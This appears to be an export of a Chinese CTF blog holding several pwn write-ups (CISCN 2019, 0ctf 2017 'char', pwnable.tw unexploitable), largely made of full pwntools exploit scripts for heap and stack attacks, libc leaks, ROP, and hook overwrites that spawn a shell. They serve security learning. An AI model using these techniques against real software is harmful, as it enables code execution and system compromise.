p.sendline('2')p.recvuntil('secret:')p.send(p64(0)+p64(0x101)+'\x00'*0xf0+p64(0)+p64(0x21)+'\x00'*0x10+p64(0)+p64(0x21))new(0xf0,'\x01'*0xf0)delete()delete()new(0xf0,p64(0xabcda010))new(0xf0,p64(0))new(0xf0,p64(0))delete()new(0x60,'\x02'*0x60)delete()delete()new(0x60,p64(0xabcda080))new(0x60,p64(0))new(0x30,'\x60\xd7')new(0x60,p64(0))new(0x60,p64(0xfbad1800)+p64(0)*3+'\x00')p.recv(8)libcbase = u64(p.recv(8)) -(0x00007f087f0d28b0- 0x7f087ece5000 )log.success('libcbase = '+hex(libcbase))one_gadget = [0x4f2c5,0x4f322,0x10a38c]malloc_hook = libcbase + libc.sym['__malloc_hook']log.success('malloc_hook = '+hex(malloc_hook))realloc = libcbase + libc.sym['__libc_realloc']log.success('realloc = '+hex(realloc))new(0x40,p64(0))delete()delete()new(0x40,p64(malloc_hook-0x10))new(0x40,p64(0))new(0x40,p64(0)+p64(libcbase+one_gadget[0])+p64(realloc+2))#gdb.attach(p)p.recvuntil('choice:')p.sendline('1')p.recvuntil('size:')p.sendline(str(0x20))#gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019全国大学生信息安全竞赛初赛pwn前四题writeups]]></title>
    <url>%2F2019%2F04%2F26%2F2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%89%8D%E5%9B%9B%E9%A2%98pwn%2F</url>
    <content type="text"><![CDATA[前言：这次比赛很尴尬，我本来以为自己报上了名，但是结果没报上。。。只能让同学给我发题目然后自己做，没法拿flag，一共六题，只做出来四题，两题栈，两题堆，最后两题做出来的队伍个数都是16个，显然不是我这小破邮大一菜狗可以做出来的 Or2。 所有的二进制文件都在这里：题目的二进制文件 栈部分：0x1 第一天_your_pwn:0x11功能分析和漏洞寻找：首先gdb看一下题目基本信息，是64位的程序，PIE开启，NX开启，relro没开全。 放进ida看一下，在main函数里只是一些准备工作没有漏洞存在，我们进入vuln函数进一步分析： 在vuln中我们发现了程序进行了41次循环，每一次输入一个下标index，以局部变量v4为基准泄露一个字节的内容，然后再改为新的数据，漏洞点在于index没有进行大小检查，可以任意大，超出v4数组的范围到达main返回地址处，这既实现了leak又实现了change，而且有41次机会，现在思路就很明了了！！ 0x12 漏洞利用：第一步还是leak出libc，根据经验我们知道在main函数返回地址附近一般会有__libc_start_main+240出现，我们可以泄露其然后进而泄露libc，这里的libc需要我们自己查找确定，我用的是wiki上的一个工具：LibcSearcher，除了libc之外，我们还应泄露一下程序的基址，因为程序开了PIE，所以我们最后改main函数返回地址的时候要构造p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)这个payload的时候pop_rdi_addr这个gadget需要程序基址。 main函数的rbp附近的stack分部如下图：我们可以利用画红圈的两个地方来leak出libc和基址。 第二步就是将main的返回地址改为payload=p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)。需要注意的是sh_addr和system可能因为libc的不同而产生一些小变化，保险起见还是直接调试看偏移最好，不要直接在libc中搜索。 0x13 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#coding:utf-8from pwn import *from LibcSearcher import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')p.recvuntil('name:')p.send('\x12\x12\x12\x12\x12\x12\x12\x12')ret_addr = [0 for i in range(6)]#----------------------------------------leak __libc_start_main_addr-------------------------------for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+8+i)) #具体数字自己调试，之后同，只要一块对了，然后之后算偏移即可。 p.recvuntil('value(hex) ') addr = p.recv(8) if(addr[0]=='f'): addr = int(addr[6:],16) else: addr = int(addr[0:2],16) log.success('one_addr = '+hex(addr)) p.recvuntil('new value\n') p.sendline(str(addr)) ret_addr[i] = addr__libc_ret = ''for i in range(6): if(len(str(hex(ret_addr[5-i])))&lt;4): __libc_ret+= '0'+str(hex(ret_addr[5-i]))[2:] else: __libc_ret+= str(hex(ret_addr[5-i]))[2:]__libc_ret = int(__libc_ret,16)log.success('__libc_ret = '+hex(__libc_ret))#---------------------------------------leak __libc_start_main_addr success------------------------#---------------------------------------leak base_addr---------------------------------------------for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+i)) p.recvuntil('value(hex) ') addr = p.recv(8) if(addr[0]=='f'): addr = int(addr[6:],16) else: addr = int(addr[0:2],16) log.success('one_addr = '+hex(addr)) p.recvuntil('new value\n') p.sendline(str(addr)) ret_addr[i] = addrpop_rdi = ''for i in range(6): if(len(str(hex(ret_addr[5-i])))&lt;4): pop_rdi+= '0'+str(hex(ret_addr[5-i]))[2:] else: pop_rdi+= str(hex(ret_addr[5-i]))[2:]#--------------------------------------leak base_addr success-----------------------------------pop_rdi = int(pop_rdi,16)pop_rdi = pop_rdi + 0x63log.success('pop_rdi_addr = '+hex(pop_rdi))#--------------------------------------gain pop_rdi_addr success---------------------------------__libc_start_main_addr = __libc_ret - 240libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)libcbase = __libc_start_main_addr - libc.dump('__libc_start_main')log.success('libcbase = '+hex(libcbase))system_addr = libcbase + libc.dump('system') + 0x10 #自己调试进行调整，因为libc可能有微小差别。sh_addr = libcbase + (0xc1ed57-0xa92000) #自己调试，算偏移即可。log.success('system_addr = '+hex(system_addr))log.success('sh_addr = '+hex(sh_addr)) #-------------------------------------gain system_addr and sh_addr success-----------------------#-------------------------------------将main函数返回地址改为pop_rdi_addr为system准备参数----------for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+8-288+i)) p.recvuntil('new value\n') p.sendline(str(int(str(hex(pop_rdi))[12-2*i:14-2*i],16)))for i in range(8): p.recvuntil('input index\n') p.sendline(str(624+8-288+8+i)) p.recvuntil('new value\n') if(i&lt;6): p.sendline(str(int(str(hex(sh_addr))[12-2*i:14-2*i],16))) else: p.sendline('0')for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+8-288+16+i)) p.recvuntil('new value\n') p.sendline(str(int(str(hex(system_addr))[12-2*i:14-2*i],16)))for i in range(9): p.recvuntil('input index\n') p.sendline('0') p.recvuntil('new value\n') p.sendline('0')#-------------------------------success---------------------------------------------------------p.recvuntil('(yes/no)? \n')#gdb.attach(p)p.sendline('no')p.interactive() 0x14 收货：可能在数据的处理和转化方面，字符串，16进制数，十进制数之间转化和拼接拆分有点繁杂，（可能因为我对python不太熟悉），其他到没有什么太坑人的地方，一些细节问题也需要注意一下，我从下午三点开始，五点不到解出的，基本都是在处理数据之间的转化和拼接。可能还有更好的思路，我也不敢过多评说。 0x2 第二天_baby_pwn:0x21 程序分析：额。。。这一题怎么说呢，程序啥都没有，32位的，简直是ret2_dl_resolve的标准模板，直接把XDCTF 2015的pwn200的exp搬过来改改数据就行了orz，比赛的时候秒出的。。。。。 至于ret2_dl_resolve的教程在wiki上有，这篇文章也很详细：ret2_dl_resolve，我就不斗胆再说了orz，这里只分享一些我的感悟： 0x22 ret2_dl_runtime_solve 总结：需要对三个部分和函数延迟绑定技术的流程熟悉： .rel.plt节(函数重定位表)的结构体： //readelf -r typedef struct {Elf32_Addr r_offset; // 即got表的条目 Elf32_Word r_info; // 很重要，为重点伪造对象。 } Elf32_Rel;#define ELF32_R_SYM(info) ((info)&gt;&gt;8)#define ELF32_R_TYPE(info) ((unsigned char)(info))#define ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type)) .dynsym节(动态链接符号表)的结构体（其大小在32位中为0x10）：typedef struct{Elf32_Word st_name; // 函数名字符串相对于.dynstr节起始地址的偏移Elf32_Addr st_value; // Symbol valueElf32_Word st_size; // Symbol sizeunsigned char st_info; // Symbol type and bindingunsigned char st_other; // Symbol visibility under glibc&gt;=2.2Elf32_Section st_shndx; // Section index} Elf32_Sym; .dynstr节（动态链接的字符串）中储存了函数名。 //节的地址可以用readelf -S 来看。 .延迟绑定。用下图可以直观的看到。 我们需要清楚GOT[0],GOT[1],GOT[2]和PLT[0]中的内容。 我们需要做的就是在使调用函数的整个过程被我们所控制，首先劫持栈： payload+= p32(pop_rbp) + p32(mystack) + p32(leave_ret) 然后需要在栈上布置这种结构：payload = p32(mystack)payload+= p32(plt_0_addr)payload+= p32(fake_index)payload+= p32(ret_addr)payload+= p32(arguments)payload+= fake_relpayload+= fake_sympayload = payload.ljust(0x80,’\x00’)payload+= fake_str 之后我们要做的事分三步：1.伪造fake_index来使程序跳入我们自己的fake_rel结构体2.构造fake_rel的r_info来使程序跳到我们自己的fake_sym结构体 (这里需要我们自己来构造字节对齐。)3.构造fake_sym结构体的st_name来使程序跳到我们自己的fake_str字符串。其中fake_index，fake_rel，fake_sym，fake_str的地址都需要我们自己能够精确地控制。（栈注意迁移即可。） 0x23 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#coding:utf-8from pwn import *context(os='linux',arch='i386')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')lr = 0x08048448bss = 0x0804aa00pppr_addr = 0x080485d9pop_ebp = 0x080485dbpayload = (0x28+4) * 'a'payload+= p32(P.plt['read'])payload+= p32(pppr_addr)payload+= p32(0)payload+= p32(bss) payload+= p32(0x400)payload+= p32(pop_ebp)payload+= p32(bss)payload+= p32(lr)p.send(payload)sleep(1)plt_0 = 0x08048380r_info = 0x107rel_plt = 0x0804833c dynsym = 0x080481dcdynstr = 0x0804827cfake_sys_addr = bss + 36align = 0x10 - ((fake_sys_addr-dynsym)&amp;0xf)fake_sys_addr = fake_sys_addr + alignindex = (fake_sys_addr - dynsym)/0x10r_info = (index &lt;&lt; 8) + 0x7st_name = (fake_sys_addr + 0x10) - dynstrfake_sys = p32(st_name) + p32(0) + p32(0) + p32(0x12) fake_rel = p32(P.got['read']) + p32(r_info)fake_rel_addr = bss + 28fake_index = fake_rel_addr - rel_plt payload = p32(bss)payload+= p32(plt_0)payload+= p32(fake_index)payload+= p32(0xdeadbeef)payload+= p32(bss+0x80)payload+= p32(0)payload+= p32(0)payload+= fake_relpayload+= 'a'*alignpayload+= fake_syspayload+= 'system'payload = payload.ljust(0x80,'\x00')payload+= '/bin/sh\x00'p.sendline(payload)p.interactive() 0x24 赛后：在群里听一些师傅说可以用其他方法，爆破syscall之类的，我也不懂orz。。。。。不过貌似ret2_dl_solve在现在的题目中很少出现了。。。。但学了总比不知道好QAQ 堆部分：(⊙o⊙)…我个人觉得这两道堆虽然都算不上难（难的话我也不可能做出来了orz），但是也都是稳中有变，还是挺有趣的，其中第一题daily漏洞点比较隐蔽，发现以后可以用double free或者unlink都行，我用unlink做到快最后的时候被一个地方卡住了（wtf &gt;_&lt;），感觉中间有点乱，就重新开始的，结果肝到最后才肝出来。第二天的是double，这一题比较顺利，两个小时不到就解出了，但是没想到他最后的分值竟然比daily高！！！（wtf 逗我????） 0x3 第一天_daily:0x31 程序分析和漏洞寻找：首先看一下程序的基本信息，为64位，PIE没开，relro为full，估计是堆题，需要改malloc_hook或者free_hook为one_gagdet的通用套路。 放进ida里进一步分析，发现程序有四个功能，add()，delete()，upgrade()，view()。 程序大致的流程就是在bss段有一个已知的地址区域存放各chunk的可用大小和堆指针（一个结构体占0x10大小），然后可以申请大小在0x100之下的chunk，可以不填满，但是没有溢出漏洞。upgrade()也没有溢出漏洞，输入的大小不能超过原先申请的大小，view()是以字符串的形式来打印chunk的内容。delete()就是通过index找到目标chunk，然后free()。 浏览一遍发现似乎没有什么漏洞点orz，于是在次仔细看了一遍，发现了在delete()中在free()的时候index没有检查，所以我们可以free()任意地址的chunk。 0x32 漏洞利用：第一步还是leak，这里我们需要思考我们需要leak出什么，libc我们肯定需要leak，因为malloc_hook或者free_hook或者one_gadget的真实地址都需要libc，其次我们还需要leak出heap的地址，因为我们要在heap里伪造chunk来进行unlink或者double free，所以必须得知道heap的地址，才能知道我们的fake_chunk的地址并把它放入伪造的chunk结构体中，进而成功free()出fake_chunk。因为要泄露libc和heap所以我们最好获取一个曾经在largebin之中的chunk的头部，所以先申请两个0x200大小的chunk，然后将它们free()，之后unsortedbin之中会出现一个0x420的chunk，然后我们再申请一个chunk的时候，根据glibc的机制，unsortedbin中的chunk会被遍历检查看有没有大小正好合适的，有的话直接分，没有的话会将所有的chunk放入对应的bins中，所以0x420的chunk被放入largebin中，所以再申请时我们得到的chunk是从largebin中切下来的fd_nextsize和bk_nextsize会被启用： 然后我们就可以通过对这个新的chunk读来泄露libc和heap地址。 leak成功后，我们可以在随便一个0x200大小（大小足够就行。）的chunk里进行unlink的构造，然后通过偏移计算index来欺骗delete()，最后unlink实现之后我们就可以将Index 4的指针改为malloc_hook的地址，然后再edit()改为one_gadget即可。。。。。但是！！！操蛋的是我不知道为什么malloc_hook行不通，我试了四个gadgets都不行，以为凉了，结果换成free_hook就成了，不知道是什么原因orz，真的神奇&gt;_&lt;………. double_free思路我就不说了，自己看exp吧，类似的。。。比unlink要简单一点。。。。 0x33 unlink思路_exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#coding:utf-8from pwn import *#from LibcSearcher import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./daily')def add(size,payload): p.recvuntil('choice:') p.sendline('2') p.recvuntil('daily:') p.sendline(str(size)) p.recvuntil('daily\n') p.send(payload)def view(): p.recvuntil('choice:') p.sendline('1')def delete(index): p.recvuntil('choice:') p.sendline('4') p.recvuntil('daily:') p.sendline(str(index))def upgrade(index,payload): p.recvuntil('choice:') p.sendline('3') p.recvuntil('daily:') p.sendline(str(index)) p.recvuntil('daily\n') p.send(payload)payload = '\x66'*0x200add(len(payload),payload) #index 0add(len(payload),payload) #index 1add(len(payload),payload) #index 2add(len(payload),payload) #index 3delete(1) #delete 1delete(2) #delete 2payload = '\x12'*8add(0x1a0,payload) #index 1 size无所谓，看心情。。。#-------------------------------------------利用large chunkl来leak libcbase和heapbase---------view()p.recvuntil('\x12\x12\x12\x12\x12\x12\x12\x12')main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - (0xf68-0xb20)log.success('main_arena_addr = '+hex(main_arena_addr))libcbase = main_arena_addr - (0x4be5b20-0x4821000)log.success('libcbase = '+hex(libcbase))payload = '\x12'*12+'\x21'*4upgrade(1,payload)view()p.recvuntil('\x21\x21\x21\x21')heap_addr = u64(p.recv(4).ljust(8,'\x00')) - 0x210log.success('heap_addr = '+hex(heap_addr))#gdb.attach(p)#-----------------------------------------------leak success--------------------------------------payload = 'a'*8add(0x260,payload) #index 2 这里清空unsortedbin为了使之后的思路更清晰。#gdb.attach(p)#-----------------------------------------------prepare unlink------------------------------------payload = p64(0)payload+= p64(0xa1)payload+= p64(0)*2payload+= p64(0xa0)payload+= p64(heap_addr+0x20)payload = payload.ljust(0xa0,'\x00')payload+= p64(0x0)payload+= p64(0x91)payload+= p64(0)*2payload+= p64(0x80)payload+= p64(heap_addr+0xc0)payload = payload.ljust(0x130,'\x00')payload+= p64(0)payload+= p64(0x21)payload+= p64(0)*2payload+= p64(0)payload+= p64(0x21)upgrade(0,payload)#gdb.attach(p)index = (heap_addr + 0x30 - 0x602060)/0x10delete(index) #gdb.attach(p)payload = p64(0)add(0x90,payload) #index 4payload = p64(0)*2payload+= p64(0)payload+= p64(0x91)payload+= p64(0x6020a8-0x18)payload+= p64(0x6020a8-0x10)payload+= p64(0)*14payload+= p64(0x90)payload+= p64(0x90)payload+= p64(0)*2payload+= p64(0x80)payload+= p64(heap_addr+0xc0)payload+= p64(0)*12payload+= p64(0)payload+= p64(0x21)payload+= p64(0)*2payload+= p64(0)payload+= p64(0x21)upgrade(0,payload)#gdb.attach(p)index = (heap_addr + 0xd0 - 0x602060)/0x10delete(index)#gdb.attach(p)#-------------------------------unlink success---------------------------------------------free_hook = libcbase + (0x1728f7a8 - 0x16ec9000)log.success('free_hook = ' + hex(free_hook))payload = p64(0)*2payload+= p64(0x80)payload+= p64(free_hook)upgrade(4,payload)#gdb.attach(p)one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]upgrade(4,p64(one_gadget[1]+libcbase))#gdb.attach(p)delete(0)p.interactive() 0x35 double_free思路_exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#coding:utf-8from pwn import *#from LibcSearcher import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./daily')def add(size,payload): p.recvuntil('choice:') p.sendline('2') p.recvuntil('daily:') p.sendline(str(size)) p.recvuntil('daily\n') p.send(payload)def view(): p.recvuntil('choice:') p.sendline('1')def delete(index): p.recvuntil('choice:') p.sendline('4') p.recvuntil('daily:') p.sendline(str(index))def upgrade(index,payload): p.recvuntil('choice:') p.sendline('3') p.recvuntil('daily:') p.sendline(str(index)) p.recvuntil('daily\n') p.send(payload)payload = '\x66'*0x200add(len(payload),payload) #index 0add(len(payload),payload) #index 1add(len(payload),payload) #index 2add(len(payload),payload) #index 3delete(1) #delete 1delete(2) #delete 2payload = '\x12'*8add(0x1a0,payload) #index 1 #------------------------------------------------利用large chunkl来leak libcbase和heapbase---------------------------------view()p.recvuntil('\x12\x12\x12\x12\x12\x12\x12\x12')main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - (0xf68-0xb20)log.success('main_arena_addr = '+hex(main_arena_addr))libcbase = main_arena_addr - (0x4be5b20-0x4821000)log.success('libcbase = '+hex(libcbase))payload = '\x12'*12+'\x21'*4upgrade(1,payload)view()p.recvuntil('\x21\x21\x21\x21')heap_addr = u64(p.recv(4).ljust(8,'\x00')) - 0x210log.success('heap_addr = '+hex(heap_addr))#gdb.attach(p)#-----------------------------------------------leak success--------------------------------------payload = 'a'*8add(0x31,payload) #index 2 #------------------------------------------------prepare doublefree--------------------------------payload = p64(0)+p64(0x31) payload+= p64(0)*2payload+= p64(0x20)+p64(heap_addr+0x20)payload+= p64(0)+p64(0x31)payload+= p64(0)*2payload+= p64(0x20)+p64(heap_addr+0x50)payload+= p64(0)+p64(0x31)upgrade(0,payload)index = (heap_addr + 0x30 - 0x602060)/0x10delete(index)index = (heap_addr + 0x60 - 0x602060)/0x10delete(index)payload = p64(0)+p64(0x31) payload+= p64(0)*2payload+= p64(0x20)+p64(heap_addr+0x20)payload+= p64(0)+p64(0x31)upgrade(0,payload)index = (heap_addr + 0x30 - 0x602060)/0x10delete(index)#-----------------------------------------------double free success--------------------------------payload = p64(0x602078) add(0x20,payload) #index 3free_hook = libcbase + (0x1728f7a8 - 0x16ec9000)log.success('free_hook = ' + hex(free_hook))payload = p64(free_hook)add(0x20,payload) #index 4add(0x20,payload) #index 5add(0x20,payload) #index 6one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]upgrade(2,p64(one_gadget[1]+libcbase))delete(4)p.interactive() 0x36 收货：可能需要对free()的检查机制了解的比较深入才能得心应手的快速解出这一题，我第一遍因为思路不清晰导致不知道改了一个什么东西总是报错，第二遍整理一下思路才Pwn掉，挺丢人的。。。。。题目出的稳中有活，难度也适合像我这种初学者，感觉出的不错。。。。&gt;_&lt;. 0x4 第二天_double:0x41 程序功能分析：首先看一下程序的基本信息：64位，relro为paril，没开PIE，看题目的名字猜是double free….(但实际上最后我没用上double,只用了uaf来构造fake_chunk….orz) 放进ida看一下：程序是按照链表的形式表现的，之前做过一个类似的链表的题目。。。感觉比这个难一点。。首先head_ptr和prev_ptr都清零。。(这里变量我已经rename了，所以看着好理解一点，开始自己看的时候还是需要看一会) 之后程序有4个功能，new()，show()，edit()，delete()： 分析程序功能以后，new()大概功能就是在堆上申请一个chunk_header(总大小为0x20，之中储存了content的size和chunk的index，，以及自己的content的地址和上一个chunk的chunk_header的地址。)，然后先将我们的输入储存在一个缓冲区，然后比较其内容和上一个chunk的content是否一样，如果一样话，就不再用malloc()申请新的chunk，而是将其的content地址直接指向上一个chunk的content地址，若不一样的话就再malloc()一块和我们输入大小一样的chunk。 show()的功能为输入下标然后遍历chunk链表找到下标符合的chunk然后以字符串的形式打印其content内容（\x00截断） edit()的功能为输入下标然后遍历chunk链表找到下表合适的chunk然后比较我们输入的centent大小和之前的大小，若比其小则直接在原content处覆盖，若比其大则再malloc()一块chunk。 delete()的功能为输入下标然后遍历chunk链表知道下标合适的chunk然后先释放其content指针，再释放其chunk_header指针。需要注意的是这个程序是一旦delete()一个下标之后，这个下标将不再存在，下一次再申请是继续往后延伸的下标，不会找已经已经free()的小的下标。细节不要搞错了。。。 0x42 漏洞寻找：先找了一会，没有发现溢出漏洞。。。然后开始考虑 uaf 和 double free，利用glibc的机制来leak和构造fake，然后发现如果申请两个内容相同的chunk时，然后delete()其中一个，但另外一个仍然可以对已经放进bins的原先装content的那个chunk进行读写操作。。。思路开始变得清晰。。。 0x43 漏洞利用：首先我们申请一个大小范围在fastbin之外（总大小大于0x80）的chunk，然后进行uaf的读操作泄露出libc，之后再申请小的chunk，这些小的chunk和他们的chunk_header都会被分配在uaf的区域（因为其原先在unsortedbin中），然后我们可以通过uaf的写入功能更改新chunk_header的content指针为free_got的地址，并且先在堆中写入’/bin/sh\x00’，然后通过新chunk的upgrade功能将free_addr改为system_addr，然后再申请一个新的小chunk，其header应该还是在uaf区域，然后通过uaf的写入修改其content指针为‘/bin/sh\x00’字符串的地址（我们之前已经写在了堆上，所以我们需要泄露heap的地址！！方法类似，在最开始的时候申请一个大小在fastbin范围内的chunk然后进行uaf，利用uaf的读功能泄露heap地址。），最后delete()最后申请的那个chunk即可，在free(content指针)时就等于调用了system(‘/bin/sh\x00’)。 0x44 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')def new(payload): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('data:\n') p.sendline(payload)def edit(index,payload): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(index)) p.sendline(payload)def delete(index): p.recvuntil('&gt; ') p.sendline('4') p.recvuntil('index: ') p.sendline(str(index))def list_(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('index: ') p.sendline(str(index))new('\x11'*0xf) #index 0 new('\x11'*0xf) #index 1 0和1共用content chunknew('\x22'*0x7f) #index 2new('\x22'*0x7f) #index 3 2和3共用content chunknew('\x44'*0xf) #index 4 防topchunk合并#gdb.attach(p)delete(3)#-------------------------------------leak libcbase and system_addr and heap-----------------------list_(2)main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - 88log.success('main_arena = '+hex(main_arena_addr)) libcbase = main_arena_addr - (0xdd8b20-0xa14000)log.success('libcbase = '+hex(libcbase))system_addr = libcbase + (0xbab390 - 0xb66000)log.success('system_addr = '+hex(system_addr))#gdb.attach(p)delete(1)list_(0)heap_addr = u64(p.recv(4).ljust(8,'\x00')) - 0x110log.success('heap_addr = '+hex(heap_addr))#--------------------------------------leak success------------------------------------------------new('\x55'*0xf) #index 5new('\x66'*0xf) # 6new('\x77'*0xf) # 7new('\x88'*0xf) # 8payload = '/bin/sh\x00'payload+= '\x55'*0x10payload+= p64(0x21)payload+= '\x07'+'\x00'*3+'\x0f'+'\x00'*3payload+= p64(P.got['free'])payload+= p64(heap_addr+0xf0)payload+= p64(0x21)payload+= '\x22'*0x18payload+= p64(0x31)payload+= '\x08'+'\x00'*3+'\x0f'+'\x00'*3payload+= p64(heap_addr+0x90) #“/bin/sh\x00”的地址。edit(2,payload)payload = p64(system_addr)edit(7,payload)delete(8)p.interactive() 0x45 收货：感觉挺有趣的，链表形式的题目还是很有趣，觉得无论是doublefree还是什么，对glibc的机制了如指掌才是真正的王道。。。对每一块chunk的来源和去向和他们什么时候该有什么内容都在心中清楚才能最快的找到思路并且在调试上节约时间。。。这一题最后是100p，比daily还高，可能考的堆机制的理解更深一点吧。。。。 本文由安全客原创发布转载，请参考转载声明，注明出处： https://www.anquanke.com/post/id/177035]]></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017-0ctf-char-writeup]]></title>
    <url>%2F2019%2F04%2F13%2F2017-0ctf-char-writeup%2F</url>
    <content type="text"><![CDATA[首先提供题目的二进制文件2017-0ctf-char。 预览：拿到题目先预览，发现程序为32位且保护很少，估计应该是栈题，运行一下发现程序似乎很简单。。。放进ida看一下反汇编码，发现程序确实不难，但是有几个需要注意的地方。 我们可以看到程序将libc通过mmap()映射到了固定的0x5555e000处，这等于我们不需要泄露libc就可以确定函数和gadgets的真实地址，带来了极大的方便。比较麻烦的是程序有一个check的函数，检查每个字符必须为可见字符（16进制的大小范围为0x1f~0x7e）,但我们又发现，他的v1是由strlen()确定的，我们可以通过scanf()只看空格和回车结束来输入’\x00’使其提前结束。。。。。但我们又发现了一个问题。。。就是在漏洞函数中我们的strcpy也是通过’\x00’来判断的。这就很让人蛋疼。。。。这就是说我们通过strcpy()复制到漏洞点的字符串就是我们截断前的那一小段。。。。 漏洞寻找和分析：很明显有一个漏洞函数，通过strcpy()造成溢出。这个不难发现，难点在于check()给我们的rop链造成了很大的障碍。check的存在注定我们复制到溢出点的数据长度不可能太长，但无论我们是调用函数并且给函数准备参数还是gadgets都需要占用不少的位置，这几乎是不可能成功的。如下图可见一点： system()和execve()都过不了检查。。。我们能想到的就是我们必须在小的溢出数据范围内调用一些gadgets而使esp迁移到main的栈数据区域(我们的复制源)，而不能在漏洞函数里卡死，迁移到源数据后这题就变得很简单。难点在于gadgets的合适选择和寻找。 漏洞利用：我是通过观察strcpy()之后发现ecx似乎一直指在源数据的中间固定区域（相对偏移不变），所以想到使ecx的值赋给esp使esp直接跳转，但是通过搜索gadgets发现只能通过 mov eax,ecx; ret; xchg eax,esp; ret b; 来实现紧接着再通过具体的细节调整使跳转过后的esp指向addr_pop_ebx为int 0x80准备参数，准备调用execve(‘/bin/sh’,0,0)。具体细节还得自己验证。 exp如下：(调用函数实现的就不写了，请自己调试尝试)12345678910111213141516171819202122232425262728293031323334353637383940414243#coding:utf-8from pwn import *p = process('./char')context(os='linux',arch='i386')#context.log_level = 'debug'p.recvuntil('GO : ) \n')base = 0x5555e000sh_addr = 0x15D7EC#pop_ebx = 0x109D07 xor_eax_pop_ebx = 0x7dce9pop_ecx = 0xcae3bpop_edx = 0x1a9eint_0x80 = 0x2df35inc_eax = 0x26a9bnop_xor_eax = 0x7403axchg_eax_esp_retb = 0xe6d62mov_eax_ecx = 0x148253payload = 'a'*0x1cpayload+= p32(mov_eax_ecx+base) payload+= p32(mov_eax_ecx+base)payload+= p32(xchg_eax_esp_retb+base)payload+= '\x00'*3payload+= p32(xor_eax_pop_ebx+base)payload+= p32(sh_addr+base)payload+= p32(pop_ecx+base)payload+= p32(0)payload+= p32(pop_edx+base)payload+= p32(0)#payload+= p32(nop_xor_eax+base) nop_xor_eax+base=0x555d203a '\x20'空格字符会将在scanf()读的时候将payload截断.for i in range(11): payload+= p32(inc_eax+base)payload+= p32(int_0x80+base)pause()#gdb.attach(p)p.sendline(payload)p.interactive() 收货： gadgets的寻找：通过ROPgadgets –binary *** &gt; gadget 然后再在文件gadget里通过查找功能查找。（再次感谢川大的师傅 orz ） ret x 的意义是 eip 跳转之后esp = esp+4+x。 scanf( ) 看回车和空格结束，str( )系列函数看 ‘\x00’ 结束。]]></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
      <tags>
        <tag>栈（gadgets的较复杂运用）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw unexploitable writeup]]></title>
    <url>%2F2019%2F04%2F06%2Fpwnable-tw-unexploitable-writeup%2F</url>
    <content type="text"><![CDATA[花了将近一天半的时间研究这一题，因为最近在熟练srop技术，所以在看到pwnbale.kr上的那道unexploitable之后，想趁热打铁来试试这道500p的题目。收货颇丰啊~~~ 虽然看了网上的思路，但exp还是自己搞了出来，还是有点小小成就感。 题目的二进制文件和libc自己去网站上找吧pwnable.tw. 首先拿到题目我们看到没有了syscall，变为了call read，这个变化导致题目直接上了一个档次。使我们的思路陷入死活同：我们需要调用system(‘/bin/sh’)的话，需要先泄露libc，但是程序本身没有输出函数，我们又只能通过系统调用来调用write等函数，可是又没有syscall；或者我们需要调用execve(‘/bin/sh’)，仍然需要syscall来触发。也就是说没有syscall我们什么都干不了。。。。 这个时候就需要独特的思路和脑洞。。。这也是为什么值500p的原因。。。。我们动态调试read函数内部会发现其第三条语句就是syscall，而且read()和syscall只有LSB(最后一个有效字节)不相等！！如果先将read()的LSB改为syscall的LSB，再搭配64位通用gadgets，call [read_got]就等于jmp syscall。我们获得了syscall。 之后思路分为： 先利用 pop rbp; ret; 和 leave; ret; 来劫持栈到我们选定的bss段（实际上是加载后的空闲段）。 然后用64位通用gadgets来改写read()的LSB（这一步过后就没法调用read()了，所以我们得用其他函数来控制rax），之后rax的值为1，正好调用write()，再利用write()出59个字符使rax为59，再调用exevce()（其参数应早一步在bss段布置好） （这种思路最简单，已成功） 或者用write()泄露出Libc，然后调用system()，但是这里需要再输入一次，所以我们必须利用write()来控制sleep()，再利用sleep()返回0，来调用read()写入system()真实地址。（这种思路未成功，因为不知道nanosleep()的返回值具体机制，但是似乎没有调用之后read()） 思考和收货： 